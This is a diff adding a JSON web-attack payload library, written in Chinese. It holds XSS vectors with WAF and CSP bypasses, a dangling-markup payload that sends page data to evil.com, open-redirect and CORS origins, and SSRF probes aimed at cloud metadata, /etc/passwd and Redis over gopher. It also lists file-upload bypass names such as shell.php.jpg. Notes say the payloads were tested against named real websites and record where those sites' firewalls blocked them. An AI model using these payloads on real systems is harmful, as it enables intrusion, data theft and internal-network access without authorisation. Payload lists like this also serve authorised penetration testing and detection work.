@@ -1,0 +1,103 @@
+{
+  "name": "XSS + 安全测试Payload库",
+  "version": "2.0",
+  "based_on": "ihep.cas.cn + bpeg.cn + didachuxing.com 实战验证",
+  "categories": {
+    "reflected_xss": {
+      "description": "反射型XSS，按注入上下文分类",
+      "html_context": [
+        {"name": "Script标签", "payload": "<script>alert(1)</script>", "bypasses": "无"},
+        {"name": "Img onerror", "payload": "<img src=x onerror=alert(1)>", "bypasses": "无script关键字"},
+        {"name": "Svg onload", "payload": "<svg/onload=alert(1)>", "bypasses": "无空格无闭合"},
+        {"name": "Body onload", "payload": "<body onload=alert(1)>", "bypasses": "body标签"},
+        {"name": "Details ontoggle", "payload": "<details open ontoggle=alert(1)>", "bypasses": "不常见事件"}
+      ],
+      "href_context": [
+        {"name": "Javascript协议", "payload": "javascript:alert(1)", "notes": "实战: didachuxing WAF拦截"},
+        {"name": "Data协议", "payload": "data:text/html,<script>alert(1)</script>", "notes": "实战: didachuxing WAF拦截"},
+        {"name": "双引号闭合", "payload": "\" onclick=alert(1)//", "notes": "实战: didachuxing WAF拦截(244B)"},
+        {"name": "单引号闭合", "payload": "' onclick=alert(1)//", "notes": "实战: didachuxing WAF拦截"},
+        {"name": "无闭合空格", "payload": " onclick=alert(1)//", "notes": "不闭合直接加属性"}
+      ],
+      "url_encoded": [
+        {"name": "Script编码", "payload": "%3Cscript%3Ealert(1)%3C/script%3E", "bypasses": "URL编码"},
+        {"name": "Img编码", "payload": "%3Cimg%20src=x%20onerror=alert(1)%3E", "bypasses": "URL编码"},
+        {"name": "Svg编码", "payload": "%3Csvg/onload=alert(1)%3E", "bypasses": "URL编码"},
+        {"name": "双重编码", "payload": "%253Cscript%253Ealert(1)%253C/script%253E", "bypasses": "双重URL编码"},
+        {"name": "HTML实体", "payload": "&#34;&#34; onclick=alert(1)", "bypasses": "HTML实体编码", "notes": "实战: didachuxing WAF拦截"},
+        {"name": "Unicode编码", "payload": "\u0022\u0020onclick=alert(1)", "bypasses": "Unicode", "notes": "实战: didachuxing WAF拦截"}
+      ]
+    },
+    "dom_xss": {
+      "description": "DOM型XSS探测",
+      "payloads": [
+        {"name": "Location hash", "payload": "#<img src=x onerror=alert(1)>", "source": "location.hash"},
+        {"name": "PostMessage", "payload": "{\"type\":\"xss\",\"data\":\"<img src=x onerror=alert(1)>\"}", "source": "postMessage"},
+        {"name": "URL fragment", "payload": "#javascript:alert(1)", "source": "location.href"}
+      ]
+    },
+    "csp_bypass": {
+      "description": "CSP绕过技术",
+      "payloads": [
+        {"name": "JSONP劫持", "payload": "<script src=\"/api/jsonp?callback=alert(1)\"></script>", "bypasses": "script-src白名单"},
+        {"name": "Angular沙箱", "payload": "{{constructor.constructor('alert(1)')()}}", "framework": "AngularJS"},
+        {"name": "Vue模板", "payload": "{{this.constructor.constructor('alert(1)')()}}", "framework": "Vue.js"},
+        {"name": "Dangling markup", "payload": "<img src='https://evil.com/steal?", "bypasses": "无script执行"}
+      ]
+    }
+  },
+  "open_redirect": {
+    "description": "开放重定向Payload",
+    "params": ["redirect", "url", "return", "returnUrl", "return_url", "next", "callback", "continue", "dest", "destination", "goto", "target", "rurl", "redir", "forward"],
+    "payloads": [
+      "https://evil.com",
+      "http://evil.com",
+      "//evil.com",
+      "https:evil.com",
+      "\\\\evil.com",
+      "javascript:alert(1)",
+      "data:text/html,<script>alert(1)</script>"
+    ]
+  },
+  "ssrf": {
+    "description": "SSRF探测Payload",
+    "params": ["url", "uri", "path", "file", "src", "source", "target", "link", "image", "img", "callback", "webhook", "redirect_uri"],
+    "payloads": [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://127.0.0.1:8080/",
+      "http://localhost:22/",
+      "file:///etc/passwd",
+      "gopher://127.0.0.1:6379/_INFO",
+      "dict://127.0.0.1:6379/info"
+    ]
+  },
+  "file_upload": {
+    "description": "文件上传绕过Payload",
+    "extensions": [
+      ".php", ".php5", ".phtml", ".pht", ".php.", ".php%00.jpg", ".php.jpg",
+      ".asp", ".aspx", ".asmx", ".ashx", ".asa", ".cer", ".cdx",
+      ".jsp", ".jspx", ".jspf", ".jspa",
+      ".war", ".jar",
+      ".html", ".htm", ".shtml"
+    ],
+    "content_types": [
+      "image/jpeg", "image/png", "image/gif", "text/plain",
+      "application/x-php", "application/octet-stream"
+    ],
+    "double_extensions": [
+      "shell.php.jpg", "shell.php.png", "shell.php.gif",
+      "shell.php%00.jpg", "shell.php%0d%0a.jpg"
+    ]
+  },
+  "cors": {
+    "description": "CORS配置错误测试",
+    "origins": [
+      "null",
+      "http://evil.com",
+      "https://evil.com",
+      "http://target.com.evil.com",
+      "http://www.target.com@evil.com",
+      "http://target.com%40evil.com"
+    ]
+  }
+}
